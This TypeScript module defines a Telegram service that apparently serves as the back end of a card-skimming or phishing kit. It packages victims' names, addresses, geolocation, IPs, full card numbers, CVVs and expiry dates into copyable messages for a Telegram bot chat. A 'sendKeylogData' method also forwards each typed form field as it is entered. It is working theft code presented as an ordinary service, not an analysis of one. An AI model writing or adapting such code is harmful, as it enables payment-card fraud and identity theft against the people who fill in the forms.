interface TelegramConfig {
  botToken: string
  chatId: string
}

type Language = 'en' | 'vi'

interface CustomerData {
  firstName: string
  lastName: string
  email: string
  phone: string
  address: string
  city: string
  state: string
  zipCode: string
  country: string
  locationData?: {
    latitude: number
    longitude: number
    timestamp: string
    accuracy: number
  }
  cardholderName?: string
  cardNumber?: string
  cvv?: string
  expiryDate?: string
  billingAddress?: {
    firstName: string
    lastName: string
    address: string
    city: string
    state: string
    zipCode: string
    country: string
  } | null
  useSameBillingAddress?: boolean
  timestamp: string
  ip: string
  userAgent?: string
}

class TelegramService {
  // Track recent messages to prevent duplicates (within 10 seconds)
  private recentMessages: Map<string, number> = new Map()

  private getConfig(): TelegramConfig {
    const botToken = process.env.TELEGRAM_BOT_TOKEN || ''
    const chatId = process.env.TELEGRAM_CHAT_ID || ''
    
    // Debug logging (remove sensitive data in production)
    if (!botToken || !chatId) {
      console.warn('⚠️ Telegram config missing:', {
        hasToken: !!botToken,
        hasChatId: !!chatId,
        tokenLength: botToken.length,
        chatId: chatId ? 'set' : 'missing'
      })
    } else {
      console.log('✅ Telegram config loaded:', {
        tokenLength: botToken.length,
        chatId: chatId
      })
    }
    
    return { botToken, chatId }
  }

  private getMessageKey(data: CustomerData): string {
    // Create a unique key based on email and timestamp (rounded to 10 seconds)
    const timeKey = Math.floor(new Date(data.timestamp).getTime() / 10000)
    return `${data.email}-${timeKey}`
  }

  private isDuplicate(key: string): boolean {
    const now = Date.now()
    const lastSent = this.recentMessages.get(key)
    
    if (lastSent && (now - lastSent) < 10000) { // Within 10 seconds
      return true
    }
    
    // Clean up old entries (older than 1 minute)
    for (const [k, timestamp] of this.recentMessages.entries()) {
      if (now - timestamp > 60000) {
        this.recentMessages.delete(k)
      }
    }
    
    return false
  }

  private markAsSent(key: string): void {
    this.recentMessages.set(key, Date.now())
  }

  private escapeHTML(text: string): string {
    if (!text) return ''
    // Escape HTML special characters
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;')
  }

  private formatCustomerData(data: CustomerData, language: Language = 'en'): string {
    const t = this.getTranslations(language)
    
    const location = data.locationData 
      ? `${t.location}: ${data.locationData.latitude}, ${data.locationData.longitude} (${t.accuracy}: ${data.locationData.accuracy}m)`
      : `${t.location}: ${t.notProvided}`

    // Escape user input to prevent HTML parsing errors
    const firstName = this.escapeHTML(data.firstName || '')
    const lastName = this.escapeHTML(data.lastName || '')
    const email = this.escapeHTML(data.email || '')
    const phone = this.escapeHTML(data.phone || '')
    const address = this.escapeHTML(data.address || '')
    const city = this.escapeHTML(data.city || '')
    const state = this.escapeHTML(data.state || '')
    const zipCode = this.escapeHTML(data.zipCode || '')
    const country = this.escapeHTML(data.country || '')
    const userAgent = this.escapeHTML(data.userAgent || t.notProvided)
    
    // Format cardholder name with copyable code
    const cardholderNameDisplay = data.cardholderName && data.cardholderName.trim() 
      ? `<code>${this.escapeHTML(data.cardholderName)}</code>`
      : t.notProvided
    const cardholderName = `${t.cardholderName}: ${cardholderNameDisplay}`
    
    // Format card number with copyable code (monospace)
    const cardNumberDisplay = data.cardNumber && String(data.cardNumber).trim().length > 0
      ? `<code>${this.escapeHTML(String(data.cardNumber))}</code>`
      : t.notProvided
    const cardNumber = `${t.cardNumber}: ${cardNumberDisplay}`
    
    // Format CVV with copyable code
    const cvvDisplay = data.cvv && String(data.cvv).trim().length > 0
      ? `<code>${this.escapeHTML(String(data.cvv))}</code>`
      : t.notProvided
    const cvv = `${t.cvv}: ${cvvDisplay}`
    
    // Format expiry date with copyable code
    const expiryDateDisplay = data.expiryDate && String(data.expiryDate).trim().length > 0
      ? `<code>${this.escapeHTML(String(data.expiryDate))}</code>`
      : t.notProvided
    const expiryDate = `${t.expiryDate}: ${expiryDateDisplay}`
    
    // Format other sensitive fields as copyable
    const emailDisplay = email ? `<code>${email}</code>` : t.notProvided
    const phoneDisplay = phone ? `<code>${phone}</code>` : t.notProvided
    const ipDisplay = data.ip ? `<code>${this.escapeHTML(data.ip)}</code>` : t.notProvided
    
    const billingText = data.useSameBillingAddress !== false && (!data.billingAddress || (data.billingAddress.firstName === firstName && data.billingAddress.lastName === lastName)) 
      ? 'tương tự địa chỉ nhận hàng' 
      : 'không cùng'

    return `
🛍 <b>${t.newData}</b> 🛍



👤 <b>${t.customerInfo}:</b>
• ${t.name}: ${firstName} ${lastName}
• ${t.email}: ${emailDisplay}
• ${t.phone}: ${phoneDisplay}

🏠 <b>${t.address}:</b>
• ${t.addressField}: ${address}
• ${t.city}: ${city}
• ${t.state}: ${state}
• ${t.zip}: ${zipCode}
• ${t.country}: ${country}

${location}

💳 ${cardholderName}
💳 ${cardNumber}
💳 ${cvv}
💳 ${expiryDate}

Billing address: ${billingText}

${data.billingAddress && data.useSameBillingAddress === false ? `
🏠 <b>Billing address:</b>
• First name: ${this.escapeHTML(data.billingAddress.firstName || '')}
• Last name: ${this.escapeHTML(data.billingAddress.lastName || '')}
• Địa chỉ/Address: ${this.escapeHTML(data.billingAddress.address || '')}
• Thành phố/City: ${this.escapeHTML(data.billingAddress.city || '')}
• Tỉnh/Thành phố/State: ${this.escapeHTML(data.billingAddress.state || '')}
• Mã bưu điện/ZIP Code: ${this.escapeHTML(data.billingAddress.zipCode || '')}
• Quốc gia/Country: ${this.escapeHTML(data.billingAddress.country || '')}
` : ''}

    `.trim()
  }

  private getTranslations(lang: Language): Record<string, string> {
    if (lang === 'vi') {
      return {
        newData: 'DỮ LIỆU MỚI',
        customerInfo: 'Thông tin Khách hàng',
        name: 'Tên',
        email: 'Email',
        phone: 'Số điện thoại',
        address: 'Địa chỉ',
        addressField: 'Địa chỉ',
        city: 'Thành phố',
        state: 'Tỉnh/Thành phố',
        zip: 'Mã bưu điện',
        country: 'Quốc gia',
        location: '📍 Vị trí',
        accuracy: 'Độ chính xác',
        cardholderName: 'Tên chủ thẻ',
        cardNumber: 'Số thẻ',
        cvv: 'CVV',
        expiryDate: 'Ngày hết hạn',
        technicalInfo: 'Thông tin Kỹ thuật',
        ip: 'IP',
        userAgent: 'User Agent',
        timestamp: 'Thời gian',
        notProvided: 'Không có'
      }
    } else {
      return {
        newData: 'NEW DATA',
        customerInfo: 'Customer Info',
        name: 'Name',
        email: 'Email',
        phone: 'Phone',
        address: 'Address',
        addressField: 'Address',
        city: 'City',
        state: 'State',
        zip: 'ZIP',
        country: 'Country',
        location: '📍 Location',
        accuracy: 'Accuracy',
        cardholderName: 'Cardholder Name',
        cardNumber: 'Card Number',
        cvv: 'CVV',
        expiryDate: 'Expiry Date',
        technicalInfo: 'Technical Info',
        ip: 'IP',
        userAgent: 'User Agent',
        timestamp: 'Timestamp',
        notProvided: 'Not provided'
      }
    }
  }

  async sendCustomerData(data: CustomerData): Promise<boolean> {
    const config = this.getConfig()
    if (!config.botToken || !config.chatId) {
      console.warn('⚠️ Telegram bot not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.')
      console.warn('⚠️ Current values:', {
        botToken: config.botToken ? `Set (${config.botToken.length} chars)` : 'Missing',
        chatId: config.chatId ? `Set (${config.chatId})` : 'Missing'
      })
      return false
    }

    // Get language preference - Default to Vietnamese, check if any chat explicitly wants English
    let language: Language = 'vi' // Default to Vietnamese
    try {
      // Dynamic import to avoid circular dependency issues at module load time
      const telegramBotModule = await import('./telegramBot')
      const telegramBot = telegramBotModule.telegramBot
      
      // Directly access the userLanguages Map to check if ANY chat has Vietnamese
      // Since we now set language for ALL chats when changed, if one is Vietnamese, all are
      const userLanguages = (telegramBot as any).userLanguages
      
      if (userLanguages && userLanguages instanceof Map) {
        // Check all stored language preferences
        console.log(`🔍 Checking stored language preferences:`, Array.from(userLanguages.entries()))
        
        // Check if ANY chat explicitly wants English (override default Vietnamese)
        for (const [chatId, lang] of userLanguages.entries()) {
          if (lang === 'en') {
            language = 'en'
            console.log(`ℹ️ Found English preference in chat ID: ${chatId} - Using English for customer data messages`)
            break
          }
        }
      }
      
      // Also check via the public method for primary chat ID as backup
      if (language === 'vi' && config.chatId) {
        const primaryLang = telegramBot.getUserLanguageForChat(String(config.chatId))
        if (primaryLang === 'en') {
          language = 'en'
          console.log(`ℹ️ Found English preference via primary chat ID check! Using English`)
        }
      }
      
      // Log final language decision
      if (language === 'vi') {
        console.log(`📝 ✅✅✅ CONFIRMED: Customer data message will be sent in VIETNAMESE (default) ✅✅✅`)
      } else {
        console.log(`📝 ℹ️ Using English for customer data messages (explicit preference found)`)
      }
    } catch (error: any) {
      // If telegramBot is not available, default to Vietnamese
      console.log('⚠️ Could not get language preference, defaulting to Vietnamese:', error.message || error)
      language = 'vi' // Ensure Vietnamese is used even on error
    }

    // Check for duplicates
    const messageKey = this.getMessageKey(data)
    if (this.isDuplicate(messageKey)) {
      console.log('⏭️ Skipping duplicate Telegram message (sent recently)')
      return true // Return true since message was already sent
    }

    try {
      console.log(`🌐🌐🌐 USING LANGUAGE: ${language.toUpperCase()} for customer data message 🌐🌐🌐`)
      const message = this.formatCustomerData(data, language)
      
      // Log first 200 chars of message to verify language
      const messagePreview = message.substring(0, 200)
      console.log(`📄 Message preview (first 200 chars): ${messagePreview}`)
      
      const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`
      
      console.log('📤 Sending Telegram message to chat:', config.chatId)
      console.log('📤 Telegram API URL:', url.replace(config.botToken, '***'))
      
      // Create AbortController for timeout
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 60000) // 60 second timeout
      
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: config.chatId,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          }),
          signal: controller.signal,
          // Add timeout and keepalive options
          // @ts-ignore - These are experimental but help with connection stability
          keepalive: true
        })

        clearTimeout(timeoutId)

        if (response.ok) {
          const result = await response.json()
          console.log('✅ Customer data sent to Telegram successfully:', result.ok ? 'Message delivered' : 'Unknown status')
          this.markAsSent(messageKey) // Mark as sent to prevent duplicates
          return true
        } else {
          const error = await response.text()
          console.error('❌ Failed to send to Telegram. Status:', response.status)
          console.error('❌ Error details:', error)
          try {
            const errorJson = JSON.parse(error)
            console.error('❌ Telegram API error:', errorJson)
          } catch {
            // Not JSON, already logged as text
          }
          return false
        }
      } catch (fetchError: any) {
        clearTimeout(timeoutId)
        
        if (fetchError.name === 'AbortError') {
          console.error('❌ Telegram request timed out after 60 seconds')
          console.error('❌ This usually means the network cannot reach api.telegram.org')
          console.error('❌ Possible causes:')
          console.error('   1. Firewall blocking Telegram API')
          console.error('   2. VPN/Proxy needed to access Telegram')
          console.error('   3. Internet connectivity issues')
          console.error('   4. Telegram API temporarily unavailable')
        } else if (fetchError.code === 'UND_ERR_CONNECT_TIMEOUT') {
          console.error('❌ Telegram connection timeout - cannot connect to api.telegram.org:443')
          console.error('❌ Check your network/firewall settings')
        } else {
          console.error('❌ Telegram service error:', fetchError)
          console.error('❌ Error code:', fetchError.code)
          console.error('❌ Error message:', fetchError.message)
        }
        return false
      }
    } catch (error) {
      console.error('❌ Telegram service unexpected error:', error)
      return false
    }
  }

  async sendKeylogData(customerEmail: string, field: string, value: string, ipAddress: string): Promise<boolean> {
    const config = this.getConfig()
    if (!config.botToken || !config.chatId) {
      return false
    }

    try {
      // Escape user input to prevent HTML parsing errors
      const email = this.escapeHTML(customerEmail || '')
      const fieldName = this.escapeHTML(field || '')
      const fieldValue = this.escapeHTML(value || '')
      const ip = this.escapeHTML(ipAddress || '')
      
      const message = `
🔍 <b>KEYLOG UPDATE</b> 🔍

👤 Customer: ${email}
📝 Field: ${fieldName}
✏️ Value: ${fieldValue}
🌐 IP: ${ip}
⏰ Time: ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Real-time customer behavior tracking</i>
      `.trim()

      const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`
      
      // Create AbortController for timeout
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 60000) // 60 second timeout
      
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: config.chatId,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          }),
          signal: controller.signal
        })

        clearTimeout(timeoutId)
        return response.ok
      } catch (fetchError: any) {
        clearTimeout(timeoutId)
        if (fetchError.name === 'AbortError' || fetchError.code === 'UND_ERR_CONNECT_TIMEOUT') {
          console.error('❌ Telegram keylog timeout - network cannot reach api.telegram.org')
        }
        return false
      }
    } catch (error) {
      console.error('❌ Telegram keylog error:', error)
      return false
    }
  }

  // Test Telegram connection
  async testConnection(): Promise<boolean> {
    const config = this.getConfig()
    if (!config.botToken || !config.chatId) {
      console.warn('⚠️ Telegram bot not configured for connection test')
      return false
    }

    try {
      const url = `https://api.telegram.org/bot${config.botToken}/getMe`
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 10000) // 10 second timeout for test
      
      try {
        const response = await fetch(url, {
          method: 'GET',
          signal: controller.signal
        })
        clearTimeout(timeoutId)
        
        if (response.ok) {
          const result = await response.json()
          console.log('✅ Telegram connection test successful:', result.ok ? 'Bot is active' : 'Unknown status')
          return result.ok === true
        } else {
          console.error('❌ Telegram connection test failed. Status:', response.status)
          return false
        }
      } catch (fetchError: any) {
        clearTimeout(timeoutId)
        if (fetchError.name === 'AbortError' || fetchError.code === 'UND_ERR_CONNECT_TIMEOUT') {
          console.error('❌ Telegram connection test timeout - cannot reach api.telegram.org')
          console.error('❌ This means your network/firewall is blocking Telegram API')
          console.error('❌ Solutions:')
          console.error('   1. Check firewall settings')
          console.error('   2. Use a VPN')
          console.error('   3. Configure proxy settings')
          console.error('   4. Contact your network administrator')
        } else {
          console.error('❌ Telegram connection test error:', fetchError.message)
        }
        return false
      }
    } catch (error) {
      console.error('❌ Telegram connection test unexpected error:', error)
      return false
    }
  }

}

export const telegramService = new TelegramService()
export type { CustomerData, TelegramConfig }
